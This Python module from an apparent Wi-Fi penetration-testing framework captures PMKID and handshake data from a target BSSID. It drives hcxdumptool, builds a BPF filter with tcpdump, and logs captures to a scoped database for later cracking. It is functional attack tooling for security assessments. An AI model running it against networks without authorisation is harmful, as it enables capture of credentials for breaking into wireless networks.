import asyncio
import os
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class PMKIDModule(Module):
    """
    Active 802.11 PMKID Capture Module.
    Acquires an exclusive monitor.locked lease and runs hcxdumptool.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.pmkid"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface")
        bssid = params.get("bssid")
        
        if not iface:
            raise ValueError("Interface is required for PMKID capture")
        if not bssid:
            raise ValueError("Target BSSID is required for PMKID capture")
            
        # Ensure capture dir exists before writing
        out_pcapng = f"/var/lib/wcarck/captures/pmkid_{job_id}.pcapng"
        os.makedirs(os.path.dirname(out_pcapng), exist_ok=True)
        
        # Channel lock (from params or DB lookup in orchestrator)
        channel = params.get("channel")
        
        # Acquire Exclusive Lease
        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "monitor.locked")
        
        # Detect hcxdumptool version for parameter compatibility
        try:
            version_proc = await asyncio.create_subprocess_exec(
                "hcxdumptool", "--version",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(version_proc.communicate(), timeout=5.0)
            version_out = stdout.decode(errors="ignore")
            v_match = __import__('re').search(r'hcxdumptool (\d+\.\d+\.\d+)', version_out)
            version = v_match.group(1) if v_match else "6.0.0"
        except Exception:
            version = "6.0.0"
            
        v_parts = [int(x) for x in version.split('.')]
        is_modern = (v_parts[0] > 6) or (v_parts[0] == 6 and v_parts[1] >= 3)
        
        if is_modern:
            # hcxdumptool v6.3.0+ (requires BPF for filtering)
            bpf_file = f"/tmp/wcarck_pmkid_{job_id}.bpf"
            cmd = [
                "hcxdumptool",
                "-i", iface,
                "-w", out_pcapng,
                "--rds=1"
            ]
            if channel:
                cmd.extend(["-c", str(channel)])
                
            # Compile BPF if tcpdump is available
            try:
                bpf_proc = await asyncio.create_subprocess_exec(
                    "tcpdump", "-i", iface, "-ddd", "-y", "IEEE802_11_RADIO", f"wlan addr1 {bssid}",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                bpf_out, _ = await asyncio.wait_for(bpf_proc.communicate(), timeout=10.0)
                with open(bpf_file, "w") as bf:
                    bf.write(bpf_out.decode(errors="ignore"))
                cmd.extend(["--bpf", bpf_file])
            except Exception as e:
                logger.warning(f"Failed to compile BPF filter for hcxdumptool v6.3+: {e}")
        else:
            # Legacy hcxdumptool (< v6.3.0)
            target_file = f"/tmp/wcarck_pmkid_{job_id}_targets.txt"
            with open(target_file, "w", encoding="ascii") as f:
                # bssid string like AA:BB:CC:DD:EE:FF -> AABBCCDDEEFF
                clean_bssid = bssid.replace(":", "")
                if __import__('re').match(r"^[0-9A-Fa-f]{12}$", clean_bssid):
                    f.write(clean_bssid + "\n")
                
            cmd = [
                "hcxdumptool", 
                "-i", iface, 
                "-o", out_pcapng, 
                f"--filterlist_ap={target_file}", 
                "--filtermode=2", 
                "--enable_status=3"
            ]
            if channel:
                cmd.extend(["-c", str(channel)])
        
        if os.name == 'nt':
            # Windows dev dummy
            cmd = ["python", "-c", f"import time; print('Capturing PMKID for {bssid}...'); time.sleep(10)"]
            
        self._process = ManagedProcess(cmd=cmd, job_id=job_id)
        await self._process.start()
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def stop(self, job_id: str) -> None:
        try:
            if self._process:
                await self._process.stop()
                self._process = None
                
            import os, uuid, hashlib
            from datetime import datetime, timezone
            from wcarck.db.session import SessionLocal
            from wcarck.db.models import Capture, JobQueue, Scope
            from sqlalchemy import select
            
            out_pcapng = f"/var/lib/wcarck/captures/pmkid_{job_id}.pcapng"
            if os.path.exists(out_pcapng):
                from wcarck.utils.pcap import verify_handshake, parse_eapol_frames
                status, valid_bssid = await verify_handshake(out_pcapng)
                eapol = await parse_eapol_frames(out_pcapng)
                
                sha256_hash = hashlib.sha256()
                try:
                    with open(out_pcapng, "rb") as f:
                        for byte_block in iter(lambda: f.read(4096), b""):
                            sha256_hash.update(byte_block)
                    sha256_val = sha256_hash.hexdigest()
                except Exception:
                    sha256_val = "unknown"
                    
                try:
                    async with SessionLocal() as session:
                        job_stmt = select(JobQueue).where(JobQueue.id == int(job_id) if job_id.isdigit() else JobQueue.id == job_id)
                        job_res = await session.execute(job_stmt)
                        job = job_res.scalar_one_or_none()
                        
                        scope_id = job.scope_id if job else None
                        project_id = job.project_id if job else None
                        
                        if not scope_id:
                            scope_stmt = select(Scope).where(Scope.active == True)
                            scope_res = await session.execute(scope_stmt)
                            scope = scope_res.scalar_one_or_none()
                            scope_id = scope.id if scope else 1
                            
                        cap = Capture(
                            type="pmkid",
                            path=out_pcapng,
                            sha256=sha256_val,
                            bssid=valid_bssid if valid_bssid else "ANY",
                            ssid="PMKID Capture",
                            status=status,
                            size_bytes=os.path.getsize(out_pcapng),
                            eapolM1=eapol["m1"],
                            eapolM2=eapol["m2"],
                            eapolM3=eapol["m3"],
                            eapolM4=eapol["m4"],
                            scope_id=scope_id,
                            project_id=project_id,
                            created_at=datetime.now(timezone.utc).replace(tzinfo=None)
                        )
                        session.add(cap)
                        await session.commit()
                    logger.info(f"Saved PMKID capture {out_pcapng} to database (Status: {status})")
                except Exception as e:
                    logger.error(f"Failed to save PMKID capture to DB: {e}")
        finally:
            if getattr(self, 'iface', None):
                await self.lease_manager.release(job_id, self.iface)
                
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._process is not None,
            "module": self.name
        }
